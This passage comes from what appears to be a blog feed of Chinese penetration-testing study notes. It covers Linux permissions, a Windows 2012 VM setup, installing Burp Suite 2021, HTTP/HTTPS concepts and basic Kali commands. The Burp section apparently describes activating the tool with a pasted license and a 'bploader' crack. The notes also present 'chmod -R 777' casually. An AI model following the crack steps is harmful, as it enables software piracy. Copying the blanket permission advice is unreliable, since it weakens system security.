hadoop默认端口未授权访问</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用编码 </tag>
            
            <tag> 端口协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali基础&amp;虚机&amp;http详解</title>
      <link href="/2021/07/18/60-zhi-day14/"/>
      <url>/2021/07/18/60-zhi-day14/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试基础知识"><a href="#渗透测试基础知识" class="headerlink" title="渗透测试基础知识"></a>渗透测试基础知识</h1><span id="more"></span><h2 id="kali基础知识"><a href="#kali基础知识" class="headerlink" title="kali基础知识"></a>kali基础知识</h2><h3 id="linux文件属性和权限设置"><a href="#linux文件属性和权限设置" class="headerlink" title="linux文件属性和权限设置"></a>linux文件属性和权限设置</h3><h4 id="文件解释"><a href="#文件解释" class="headerlink" title="文件解释"></a>文件解释</h4><p>使用 ls -al 命令列出当前目录文件(包括.)详细信息：</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718112041098.png" alt="image-20210718112041098"></p><p><img src="/2021/07/18/60-zhi-day14/image-20210718112101277.png" alt="image-20210718112101277"></p><blockquote><p>d是目录</p><p>-是文件</p><p>l是软连接  //类似于windows下的快捷方式</p></blockquote><h4 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h4><blockquote><p><strong>文件</strong>中rwx-含义：</p><ul><li>r只读权限</li><li>w写权限</li><li>x是可执行权限</li><li>-没有任何权限</li></ul><p><strong>目录</strong>中rwx含义：</p><ul><li>r具有ls权限</li><li>w是在目录上可以增加、删除、创建权限</li><li>x是具有ls -l权限(列出当前目录文件不包括.)</li></ul></blockquote><p><img src="/2021/07/18/60-zhi-day14/image-20210718112400217.png" alt="image-20210718112400217"></p><h4 id="权限设置"><a href="#权限设置" class="headerlink" title="权限设置"></a>权限设置</h4><p>chmod 777 +文件名 （给单独文件赋所有权限）</p><p>chmod -R 777 /home/user 注：表示将整个/home/user目录与其中的文件和子目录的权限都设置为rwxrwxrwx</p><blockquote><p>常用权限：</p><p>常用权限</p><ul><li>-rw——- (600) 只有所有者才有读和写的权限</li><li>-rw-r–r– (644) 只有所有者才有读和写的权限，组群和其他人只有读的权限</li><li>-rwx—— (700) 只有所有者才有读，写，执行的权限</li><li>-rwxr-xr-x (755) 只有所有者才有读，写，执行的权限，组群和其他人只有读和执行的权限</li><li>-rwx–x–x (711) 只有所有者才有读，写，执行的权限，组群和其他人只有执行的权限</li><li>-rw-rw-rw- (666) 每个人都有读写的权限</li><li>-rwxrwxrwx (777) 每个人都有读写和执行的权限</li></ul></blockquote><p>字母模式：</p><p>chmod (u)+rwx 文件名</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718112805966.png" alt="image-20210718112805966"></p><p>eg：</p><p>touch xiaoshaKa</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718112952216.png" alt="image-20210718112952216"></p><p>chmod u+rwx xiaoshaKa</p><p>chmod g-r xiaoshaKa</p><p>chmod o-r xiaoshaKa</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718113154192.png" alt="image-20210718113154192"></p><h2 id="04虚拟机创建2012系统并配置"><a href="#04虚拟机创建2012系统并配置" class="headerlink" title="04虚拟机创建2012系统并配置"></a>04虚拟机创建2012系统并配置</h2><p>我们在虚拟机上创建Windows2012虚拟机</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718122907340.png" alt="image-20210718122907340"></p><p>我们更改密码设置</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718123147650.png" alt="image-20210718123147650"></p><p><img src="/2021/07/18/60-zhi-day14/image-20210718123216823.png" alt="image-20210718123216823"></p><p><img src="/2021/07/18/60-zhi-day14/image-20210718123240586.png" alt="image-20210718123240586"></p><p>然后我们安装好vmtools后拍摄快照</p><h2 id="05在12server上安装bp2021"><a href="#05在12server上安装bp2021" class="headerlink" title="05在12server上安装bp2021"></a>05在12server上安装bp2021</h2><p>首先把这俩个放进来</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718124333848.png" alt="image-20210718124333848"></p><p>首先双击运行jdk，下一步就可</p><p>接下来把bp解压出来</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718124542378.png" alt="image-20210718124542378"></p><p>运行它到</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718124804222.png" alt="image-20210718124804222"></p><p><img src="/2021/07/18/60-zhi-day14/image-20210718124832518.png" alt="image-20210718124832518"></p><p>将license复制进去next到</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718124930226.png" alt="image-20210718124930226"></p><p>copy到bploader即可生成最后的</p><p>将生成后的放进去next</p><p>最后在桌面创个快捷方式</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718125205296.png" alt="image-20210718125205296"></p><p>完成，双击快捷方式就可以运行</p><h2 id="06http协议详解"><a href="#06http协议详解" class="headerlink" title="06http协议详解"></a>06http协议详解</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>协议是指计算机通信网络中两台计算机之间进行通信所必须共同遵守的规定或规则，超文本传输协议(HTTP)是一种通信 协议，它允许将超文本标记语言(HTML)文档从W eb服务器传送到客户端的浏览器。 </p><p>HTTP协议，即超文本传输协议(Hypertext transfer protocol)。是一种详细规定了浏览器和万维网(W W W = World Wide Web)服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。 </p><p>HTTP协议是用于从W W W服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它 不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图 形)等。 </p><p>HTTP是一个<strong>应用层协议，由请求和响应构成</strong>，是一个标准的客户端服务器模型。HTTP是一个<strong>无状态的协议</strong>。 </p><p>在Internet中所有的传输都是通过TCP/IP进行的。HTTP协议作为TCP/IP模型中应用层的协议也不例外。<strong>HTTP协议通 常承载于TCP协议之上，有时也承载于TLS或SSL协议层之上，这个时候，就成了我们常说的HTTPS。</strong>如下图所示：</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718175222811.png" alt="image-20210718175222811"></p><p><strong>HTTP默认的端口号为80，HTTPS的端口号为443。</strong> </p><p>浏览网页是HTTP的主要应用，但是这并不代表HTTP就只能应用于网页的浏览。HTTP是一种协议，只要通信的双方都 遵守这个协议，HTTP就能有用武之地。比如咱们常用的QQ，迅雷这些软件，都会使用HTTP协议(还包括其他的协议)。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p><strong>HTTP协议永远都是客户端发起请求，服务器回送响应。</strong>这样就限制了使用HTTP协议，无法实现在客户端没有发起请求 的时候，服务器将消息推送给客户端。 </p><p>HTTP协议的主要特点 可概括如下： </p><ol><li>支持客户/服务器模式。支持基本认证和安全认证。 </li><li>简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方 法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。 </li><li>灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。 </li><li>HTTP 0.9和1.0使用非持续连接：限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答 后，即断开连接。HTTP 1.1使用持续连接：不必为每个web对象创建一个新的连接，一个连接可以传送多个对象，采用 这种方式可以节省传输时间。 </li><li>无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要 前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。</li></ol><h3 id="无状态协议"><a href="#无状态协议" class="headerlink" title="无状态协议"></a>无状态协议</h3><p>协议的状态是指下一次传输可以“记住”这次传输信息的能力。 </p><p>http是不会为了下一次连接而维护这次连接所传输的信息,为了保证服务器内存。 </p><p>比如客户获得一张网页之后关闭浏览器，然后再一次启动浏览器，再登陆该网站，但是服务器并不知道客户关闭了一次 浏览器。由于W eb服务器要面对很多浏览器的并发访问，为了提高W eb服务器对并发访问的处理能力，在设计HTTP协议时规定 </p><p>Web服务器发送HTTP应答报文和文档时，不保存发出请求的Web浏览器进程的任何状态信息。这有可能出现一个浏览 器在短短几秒之内两次访问同一对象时，服务器进程不会因为已经给它发过应答报文而不接受第二期服务请求。由于 W eb服务器不保存发送请求的W eb浏览器进程的任何信息，因此<strong>HTTP协议属于无状态协议（Stateless Protocol）。</strong></p><h3 id="HTTP协议无状态和-Connection-keep-alive的区别："><a href="#HTTP协议无状态和-Connection-keep-alive的区别：" class="headerlink" title="HTTP协议无状态和 Connection:keep-alive的区别："></a><strong>HTTP</strong>协议无状态和 <strong>Connection:keep-alive</strong>的区别：</h3><p>无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。从另一方面讲，打开一个服务器上的网 页和你之前打开这个服务器上的网页之间没有任何联系。 </p><p>HTTP是一个无状态的面向连接的协议，无状态不代表HTTP不能保持TCP连接，更不能代表HTTP使用的是UDP协议 （无连接）。 </p><p>从HTTP/1.1起，默认都开启了Keep-Alive，保持连接特性，简单地说，当一个网页打开完成后，客户端和服务器之间 用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连 接。</p><p>Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间。</p><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>一次HTTP操作称为一个<strong>事务</strong>，其工作过程可分为四步： </p><ol><li>首先客户机与服务器需要建立连接。只要单击某个超级链接，HTTP的工作开始。 </li><li>建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是 MIME信息包括请求修饰符、客户机信息和可能的内容。 </li><li>服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码， 后边是MIME信息包括服务器信息、实体信息和可能的内容。 </li><li>客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。 </li></ol><p>如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端，有显示屏输出。对于用户来说，这些过程 是由HTTP自己完成的，用户只要用鼠标点击，等待信息显示就可以了。 </p><p><img src="/2021/07/18/60-zhi-day14/image-20210718180211552.png" alt="image-20210718180211552"></p><p>HTTP是基于传输层的TCP协议，而TCP是一个端到端的面向连接的协议。所谓的端到端可以理解为进程到进程之间的通 信。所以HTTP在开始传输之前，首先需要建立TCP连接，而TCP连接的过程需要所谓的“三次握手”。下图所示TCP连接 的三次握手。 </p><p><img src="/2021/07/18/60-zhi-day14/image-20210718180322667.png" alt="image-20210718180322667"></p><p>在TCP三次握手之后，建立了TCP连接，此时HTTP就可以进行传输了。一个重要的概念是面向连接，既HTTP在传输完成之间并不断开TCP连接。在HTTP1.1中(通过Connection头设置)这是默认行为。</p><h3 id="头域"><a href="#头域" class="headerlink" title="头域"></a>头域</h3><p>每个头域由一个域名，冒号（:）和域值三部分组成。<strong>域名是大小写无关的</strong>，域值前可以添加任何数量的空格符，头域可以被扩展为多行，在每行开始处，使用至少一个空格或制表符。 </p><h4 id="请求信息"><a href="#请求信息" class="headerlink" title="请求信息"></a>请求信息</h4><p>请求信息格式如下：</p><ul><li>请求行。例如GET /images/logo.gif HTTP/1.1，表示从/images目录下请求logo.gif这个文件。 </li><li>(请求)头。例如Accept-Language: en </li><li>空行   </li><li>可选的消息体。</li></ul><p>请求行和标题必须以&lt;CR&gt;&lt;LF&gt;作为结尾（也就是，回车然后换行）。空行内必须只有&lt;CR&gt;&lt;LF&gt; 而无其他空格。在HTTP/1.1协议中，所有的请求头，除post外，都是可选的。 </p><p><img src="/2021/07/18/60-zhi-day14/image-20210718182631052.png" alt="image-20210718182631052"></p><p>三个部分分别是：请求行、消息报头、请求正文。</p><h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><p>HTTP/1.1协议中共定义了八种方法（有时也叫“动作”）来表明Request-URI指定的资源的不同操作方式： </p><ol><li>OPTIONS - 返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向W eb服务器发送’*’的请求来测试服务器 的功能性。 </li><li>HEAD- 向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的 情况下，就可以获取包含在响应消息头中的元信息。该方法常用于测试超链接的有效性，是否可以访问，以及最近是否 更新。</li><li>GET - 向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中，例如在web app.中。其中一个原 因是GET可能会被网络蜘蛛等随意访问。 </li><li>POST - 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会 导致新的资源的建立和/或已有资源的修改。 </li><li>PUT - 向指定资源位置上传其最新内容。 </li><li>DELETE - 请求服务器删除Request-URI所标识的资源。 </li><li>TRACE- 回显服务器收到的请求，主要用于测试或诊断。 </li><li>CONNECT - HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 </li><li>PATCH - 用来将局部修改应用于某一资源，添加于规范RFC5789。</li></ol><p>方法名称区分大小写</p><p>get和post区别：</p><ul><li><p>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx? name=test1&amp;id=123456. </p><p>POST方法是把提交的数据放在HTTP包的Body中。 </p></li><li><p>GET提交的数据大小有限制，最多只能有1024字节（因为浏览器对URL的长度有限制）</p><p>而POST方法提交的数据没 有限制。 </p></li><li><p>GET方式需要使用Request.QueryString来取得变量的值</p><p>而POST方式通过Request.Form来获取变量的值。 </p></li><li><p>GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL 上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码。 </p></li></ul><h4 id="响应信息"><a href="#响应信息" class="headerlink" title="响应信息"></a>响应信息</h4><p>客户端向服务器发送一个请求，服务器以一个状态行作为响应。</p><p>响应的内容包括：消息协议的版本、成功或者错误编 码、服务器信息、实体元信息以及必要的实体内容。</p><p>根据响应类别的类别，服务器响应里可以含实体内容，但不是所有 的响应都有实体内容。 </p><p><img src="/2021/07/18/60-zhi-day14/image-20210718183155255.png" alt="image-20210718183155255"></p><p><img src="/2021/07/18/60-zhi-day14/image-20210718183208602.png" alt="image-20210718183208602"></p><p>三个部分分别是：状态行、消息报头、响应正文</p><h4 id="http状态响应码"><a href="#http状态响应码" class="headerlink" title="http状态响应码"></a>http状态响应码</h4><blockquote><p><strong>1</strong>(信息类)：表示接收到请求并且继续处理** </p><p>100——客户必须继续发出请求 </p><p>101——客户要求服务器根据请求转换HTTP协议版本 </p><p><strong>2</strong>(响应成功)：表示动作被成功接收、理解和接受** </p><p>200——表明该请求被成功地完成，所请求的资源发送回客户端 </p><p>201——提示知道新文件的URL </p><p>202——接受和处理、但处理未完成 </p><p>203——返回信息不确定或不完整 </p><p>204——请求收到，但返回信息为空 </p><p>205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件 </p><p>206——服务器已经完成了部分用户的GET请求 </p><p><strong>3</strong>(重定向类)：为了完成指定的动作，必须接受进一步处理** </p><p>300——请求的资源可在多处得到 </p><p><strong>301——本网页被永久性转移到另一个URL</strong> </p><p><strong>302——请求的网页被转移到一个新的地址，但客户访问仍继续通过原始URL地址，重定向，新的URL会在response中的Location中返回，浏览器将会使用新的URL发出 新的Request。</strong> </p><p>303——建议客户访问其他URL或访问方式 </p><p>304——自从上次请求后，请求的网页未修改过，服务器返回此响应时，不会返回网页内容，代表上次的文档已经被缓存了，还可以继续使用 </p><p>305——请求的资源必须从服务器指定的地址得到 </p><p>306——前一版本HTTP中使用的代码，现行版本中不再使用 </p><p>307——申明请求的资源临时性删除 </p><p><strong>4</strong>(客户端错误类)：请求包含错误语法或不能正确执行** </p><p><strong>400——客户端请求有语法错误，不能被服务器所理解</strong> </p><p><strong>401——请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</strong> </p><p>HTTP 401.1 - 未授权：登录失败 </p><p>HTTP 401.2 - 未授权：服务器配置问题导致登录失败 </p><p>HTTP 401.3 - ACL 禁止访问资源 </p><p>HTTP 401.4 - 未授权：授权被筛选器拒绝 </p><p>HTTP 401.5 - 未授权：ISAPI 或 CGI 授权失败 </p><p>402——保留有效ChargeTo头响应 </p><p><strong>403——禁止访问，服务器收到请求，但是拒绝提供服务</strong> </p><p>HTTP 403.1 禁止访问：禁止可执行访问 </p><p>HTTP 403.2 - 禁止访问：禁止读访问 </p><p>HTTP 403.3 - 禁止访问：禁止写访问 </p><p>HTTP 403.4 - 禁止访问：要求 SSL </p><p>HTTP 403.5 - 禁止访问：要求 SSL 128 </p><p>HTTP 403.6 - 禁止访问：IP 地址被拒绝 </p><p>HTTP 403.7 - 禁止访问：要求客户证书 </p><p>HTTP 403.8 - 禁止访问：禁止站点访问 </p><p>HTTP 403.9 - 禁止访问：连接的用户过多 </p><p>HTTP 403.10 - 禁止访问：配置无效 </p><p>HTTP 403.11 - 禁止访问：密码更改 </p><p>HTTP 403.12 - 禁止访问：映射器拒绝访问 </p><p>HTTP 403.13 - 禁止访问：客户证书已被吊销 </p><p>HTTP 403.15 - 禁止访问：客户访问许可过多 </p><p>HTTP 403.16 - 禁止访问：客户证书不可信或者无效 </p><p>HTTP 403.17 - 禁止访问：客户证书已经到期或者尚未生效 </p><p><strong>404——一个404错误表明可连接服务器，但服务器无法取得所请求的网页，请求资源不存在。eg：输入了错误的URL</strong> </p><p>405——用户在Request-Line字段定义的方法不允许 </p><p>406——根据用户发送的Accept拖，请求资源不可访问 </p><p>407——类似401，用户必须首先在代理服务器上得到授权 </p><p>408——客户端没有在用户指定的饿时间内完成请求 </p><p>409——对当前资源状态，请求不能完成 </p><p>410——服务器上不再有此资源且无进一步的参考地址 </p><p>411——服务器拒绝用户定义的Content-Length属性请求 </p><p>412——一个或多个请求头字段在当前请求中错误 </p><p>413——请求的资源大于服务器允许的大小 </p><p>414——请求的资源URL长于服务器允许的长度 </p><p>415——请求资源不支持请求项目格式 </p><p>416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求也不包含If-Range请求头字段 </p><p>417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求长。 </p><p><strong>5</strong>(服务端错误类)：服务器不能正确执行一个正确的请求** </p><p>HTTP 500 - 服务器遇到错误，无法完成请求 </p><p>HTTP 500.100 - 内部服务器错误 - ASP 错误 </p><p>HTTP 500-11 服务器关闭 </p><p>HTTP 500-12 应用程序重新启动 </p><p>HTTP 500-13 - 服务器太忙 </p><p>HTTP 500-14 - 应用程序无效 </p><p>HTTP 500-15 - 不允许请求 global.asa </p><p>Error 501 - 未实现 </p><p>HTTP 502 - 网关错误 </p><p>HTTP 503：由于超载或停机维护，服务器目前无法使用，一段时间后可能恢复正常</p></blockquote><h3 id="解决http无状态问题"><a href="#解决http无状态问题" class="headerlink" title="解决http无状态问题"></a>解决http无状态问题</h3><h4 id="通过cookies保存状态信息"><a href="#通过cookies保存状态信息" class="headerlink" title="通过cookies保存状态信息"></a>通过cookies保存状态信息</h4><p>通过Cookies，服务器就可以清楚的知道请求2和请求1来自同一个客户端。</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718183841727.png" alt="image-20210718183841727"></p><h4 id="通过session保存状态信息"><a href="#通过session保存状态信息" class="headerlink" title="通过session保存状态信息"></a>通过session保存状态信息</h4><p>Session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。 </p><p>当程序需要为某个客户端的请求创建一个session的时候，服务器首先检查这个客户端的请求里是否已包含了一个 session标识 - 称为 session id。</p><p>如果已包含一个session id则说明以前已经为此客户端创建过session，服务器就按 照session id把这个 session检索出来使用（如果检索不到，可能会新建一个）</p><p>如果客户端请求不包含session id， 则为此客户端创建一个session并且生成一个与此session相关联的session id。</p><p>session id的值应该是一个既不会重 复，又不容易被找到规律以仿造的字符串，这个session id将被在本次响应中返回给客户端保存。 </p><h5 id="session的实现方式："><a href="#session的实现方式：" class="headerlink" title="session的实现方式："></a><strong>session的实现方式：</strong></h5><ol><li><p>使用cookie来实现：</p><p>服务器给每个Session分配一个唯一的JSESSIONID，并通过Cookie发送给客户端。 当客户端发起新的请求的时候，将在Cookie头中携带这个JSESSIONID。这样服务器能够找到这个客户端对应的 Session。</p><p><img src="/2021/07/18/60-zhi-day14/image-20210718184359974.png" alt="image-20210718184359974"></p></li><li><p>使用url回写的方式实现：</p><p>URL回写是指服务器在发送给浏览器页面的所有链接中都携JSESSIONID的参数，这样客户端点击任何一个链接都会 把JSESSIONID带会服务器。</p><p>如果直接在浏览器输入服务端资源的url来请求该资源，那么Session是匹配不到的。 </p><p>Tomcat对Session的实现，是一开始同时使用Cookie和URL回写机制，如果发现客户端支持Cookie，就继续使用 Cookie，停止使用URL回写。如果发现Cookie被禁用，就一直使用URL回写。</p><p>jsp开发处理到Session的时候，对页面 中的链接记得使用response.encodeURL() 。 </p></li></ol><h5 id="cookie和session的区别："><a href="#cookie和session的区别：" class="headerlink" title="cookie和session的区别："></a><strong>cookie和session的区别：</strong></h5><ol><li><p>Cookie将状态保存在客户端，Session将状态保存在服务器端； </p></li><li><p>Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器。</p><p>Cookie最早在RFC2109中实 现，后续RFC2965做了增强。网络服务器用HTTP头向客户端发送cookies，在客户终端，浏览器解析这些cookies并将 它们保存为一个本地文件，它会自动将同一服务器的任何请求缚上这些cookies。</p><p>Session并没有在HTTP的协议中定 义；</p></li><li><p>Session是针对每一个用户的，变量的值保存在服务器上，用一个sessionID来区分是哪个用户session变量,这个 值是通过用户的浏览器在访问的时候返回给服务器，当客户禁用cookie时，这个值也可能设置为由get来返回给服务 器；</p></li><li><p>就安全性来说：当你访问一个使用session 的站点，同时在自己机子上建立一个cookie，建立在服务器端的 SESSION机制更安全些。因为它不会任意读取客户存储的信息。</p></li></ol><h4 id="通过表单保持状态"><a href="#通过表单保持状态" class="headerlink" title="通过表单保持状态"></a>通过表单保持状态</h4><p>除了Cookies之外，还可以使用表单变量来保持状态，比如Asp.net就通过一个叫ViewState的Input=“hidden”的框 来保持状态,比如: </p><p>&lt;input type=”hidden” name=”__VIEW STATE” id=”__VIEW STATE” value=”/wEPDwUKMjA0OTM4MTAwNGRkXUfhlDv1Cs7/qhBlyZROCzlvf5U=” /&gt; </p><p>这个原理和Cookies大同小异，只是每次请求和响应所附带的信息变成了表单变量。 </p><h4 id="通过QueryString来保持状态"><a href="#通过QueryString来保持状态" class="headerlink" title="通过QueryString来保持状态"></a>通过QueryString来保持状态</h4><p>QueryString通过将信息保存在所请求地址的末尾来向服务器传送信息，通常和表单结合使用，一个典型的 QueryString比如:<a href="http://www.xxx.com/xxx.aspx?var1=value&amp;var2=value2">www.xxx.com/xxx.aspx?var1=value&amp;var2=value2</a> </p><h3 id="url详解"><a href="#url详解" class="headerlink" title="url详解"></a>url详解</h3><p>URL(Uniform Resource Locator) 地址用于描述一个网络上的资源， 基本格式格 如下 ：</p><p>schema://host[:port#]/path/…/[;url-params][?query-string][#anchor] </p><ul><li>scheme 指定低层使用的协议(例如：http, https, ftp) </li><li>host HTTP服务器的IP地址或者域名 </li><li>port# HTTP服务器的默认端口是80，这种情况下端口号可以省略。如果使用了别的端口，必须指明，例如 ：<a href="http://www.cnblogs.com:8080/">http://www.cnblogs.com:8080/</a> </li><li>path 访问资源的路径 </li><li>url-params </li><li>query-string 发送给http服务器的数据 </li><li>anchor- 锚 </li></ul><blockquote><p>一个例子：</p><p><a href="http://www.mywebsite.com/sj/test;id=8079?name=sviergn&amp;x=true#stuff">http://www.mywebsite.com/sj/test;id=8079?name=sviergn&amp;x=true#stuff</a> </p><p>Schema: http </p><p>host: <a href="http://www.mywebsite.com/">www.mywebsite.com</a> </p><p>path: /sj/test </p><p>URL params: id=8079 </p><p>Query String: name=sviergn&amp;x=true </p><p>Anchor: stuff </p></blockquote><blockquote><p>url参数分为两种，输入参数和查询参数，例如下面这个url：</p><p><a href="https://www.google.com.hk:8080/home/search;p1=12432?neww=abc#1234">https://www.google.com.hk:8080/home/search;p1=12432?neww=abc#1234</a></p><p>其中分号后面的就是输入参数，也就是urlparse取出的params<br>问号后面的参数就是查询参数，也就是urlparse取出的query</p></blockquote><h3 id="https传输协议原理"><a href="#https传输协议原理" class="headerlink" title="https传输协议原理"></a>https传输协议原理</h3><p>HTTPS，是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容请看SSL。</p><h4 id="俩种基本的加解密算法类型："><a href="#俩种基本的加解密算法类型：" class="headerlink" title="俩种基本的加解密算法类型："></a>俩种基本的加解密算法类型：</h4><ul><li>对称加密：密钥只有一个，加密解密为同一个密码，且加解密速度快，典型的对称加密算法有DES、AES等。 </li><li>非对称加密：密钥成对出现（且根据公钥无法推知私钥，根据私钥也无法推知公钥），加密解密使用不同密钥（公钥加 密需要私钥解密，私钥加密需要公钥解密），相对对称加密速度较慢，典型的非对称加密算法有RSA、DSA等。 </li></ul><p><img src="/2021/07/18/60-zhi-day14/image-20210718190646461.png" alt="image-20210718190646461"></p><h4 id="https通信的优点："><a href="#https通信的优点：" class="headerlink" title="https通信的优点："></a>https通信的优点：</h4><ul><li>客户端产生的密钥只有客户端和服务器端能得到； </li><li>加密的数据只有客户端和服务器端才能得到明文； </li><li>客户端到服务端的通信是安全的。 </li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali基础 </tag>
            
            <tag> 虚拟机 </tag>
            
            <tag> http详解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali命令</title>
      <link href="/2021/07/18/60-zhi-day13/"/>
      <url>/2021/07/18/60-zhi-day13/</url>
      
        <content type="html"><![CDATA[<h1 id="kali基础命令"><a href="#kali基础命令" class="headerlink" title="kali基础命令"></a>kali基础命令</h1><span id="more"></span><h2 id="03kali基础命令"><a href="#03kali基础命令" class="headerlink" title="03kali基础命令"></a>03kali基础命令</h2><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><p>passwd 修改密码</p><p>passwd root 修改root用户密码</p><p>date 显示系统日期</p><p>sudo 后面加命令 就可以调用管理权限</p><p>apt-get update 更新软件列表</p><p>这个命令，会访问源列表里的每个网址，并读取软件列表，然后保存在本地电脑。我们在新立得软件包管理器里看到的软件列表，都是通过update命令更新的。</p><p>apt-get upgrade 更新软件</p><p>这个命令，会把本地已安装的软件，与刚下载的软件列表里对应软件进行对比，如果发现已安装的软件版本太低，就会提示你更新。如果你的软件都是最新版本，会提示： 升级了 0 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 0 个软件包未被升级。</p><p>apt-get dist-upgrade 更新软件  </p><p>apt-get upgrade 与 apt-get dist-upgrade 的区别</p><p>upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来.</p><p>dist-upgrade:可以聪明的解决相依性的问题,如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它.<br>(所以通常这个会被认为是有点风险的升级)</p><p>apt-get upgrade 和 apt-get dist-upgrade 本质上是没有什么不同的。</p><p>只不过，dist-upgrade<br>会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。</p><p>例如软件包 a 原先依赖 b c d，但是在源里面可能已经升级了，现在是 a 依赖 b c e。这种情况下，dist-upgrade 会删除 d 安装 e，并把 a 软件包升级，而 upgrade 会认为依赖关系改变而拒绝升级 a<br>软件包。</p><p>clear 清屏</p><p>sudo gpedit 特权调用gpedit编辑器</p><p>reboot 重启</p><p>apt-get install XXXXX 安装缺少的依赖包，（XXX）里面输入缺少依赖包的名字</p><p>apt-get autoremove –purge 软件名 删除包及其依赖的软件包+配置文件等</p><p>apt-get install +模块名 这种方法也可以安装模块,或者apt-get install python-模块名</p><p>firefox 浏览器打开</p><p>shutdown -h now 关闭系统(1)</p><p>init 0 关闭系统(2)</p><p>telinit 0 关闭系统(3)</p><p>shutdown -h hours:minutes &amp; 按预定时间关闭系统</p><p>shutdown -c 取消按预定时间关闭系统</p><p>shutdown -r now 重启(1)</p><p>reboot 重启(2)</p><p>su -l 切换登陆用户</p><p>logout 注销用户登陆</p><p>pwd 当前路径</p><h3 id="2-文件夹或文本操作"><a href="#2-文件夹或文本操作" class="headerlink" title="2.文件夹或文本操作"></a>2.文件夹或文本操作</h3><h4 id="日常"><a href="#日常" class="headerlink" title="日常"></a>日常</h4><p>cd .. 返回上一级目录</p><p>cd ../.. 返回上级两级目录</p><p>cd - 返回上次所在的目录</p><p>cd 文件夹名  进去文件夹</p><p>cd ~ 进去当前用户主目录</p><p>pwd 显示当前工作路径</p><p>touch 文件名  常见文件</p><p>cat 文件名 读取文档内容</p><p>mkdir 文件名 创建文件夹</p><p>mkdir -p 文件夹 递归创建文件夹</p><p>cp 复制命令</p><p>cp -r moon moons 复制moon 文件夹到当前 moons 如果有里面有文件 使用-r </p><p>mv 移动命令</p><p>mv moon moon 也可以说是改名</p><p>mkdir 文件名 文件名 创建多个文件夹</p><p>ls 显示文件和文件夹名</p><p>ls -a 显示所有的文件和文件夹 包含隐藏文件</p><p>ls -l 显示文件和目录的详细资料</p><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>rm -f 文件  删除文件</p><p>rm 文件夹名 删除文件夹</p><p>rm -rf  文件/文件夹  删除文件夹 及其目录下的文件</p><h4 id="压缩和解压"><a 